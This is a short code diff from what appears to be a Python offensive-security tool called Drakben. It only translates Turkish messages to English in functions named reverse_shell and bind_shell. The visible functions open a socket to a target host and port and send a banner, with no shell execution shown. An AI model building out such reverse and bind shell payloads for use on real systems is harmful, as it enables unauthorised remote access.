@@ -10,10 +10,10 @@ from modules import ai_bridge
 # Reverse Shell Payload
 # -------------------------
 async def reverse_shell(target_ip="127.0.0.1", target_port=4444):
-    print(f"[Payload] Reverse shell başlatılıyor: {target_ip}:{target_port}")
+    print(f"[Payload] Reverse shell baslatiliyor: {target_ip}:{target_port}")
     try:
         reader, writer = await asyncio.open_connection(target_ip, target_port)
-        writer.write(b"Drakben reverse shell bağlantısı kuruldu.\n")
+        writer.write(b"Drakben reverse shell connection established.\n")
         await writer.drain()
         return {"type": "ReverseShell", "success": True, "ip": target_ip, "port": target_port}
     except Exception as e:
@@ -32,7 +32,7 @@ async def bind_shell(listen_ip="0.0.0.0", listen_port=5555):
         return {"type": "BindShell", "success": False, "error": str(e)}
 
 async def handle_client(reader, writer):
-    writer.write(b"Drakben bind shell bağlantısı kuruldu.\n")
+    writer.write(b"Drakben bind shell connection established.\n")
     await writer.drain()
 
 # -------------------------
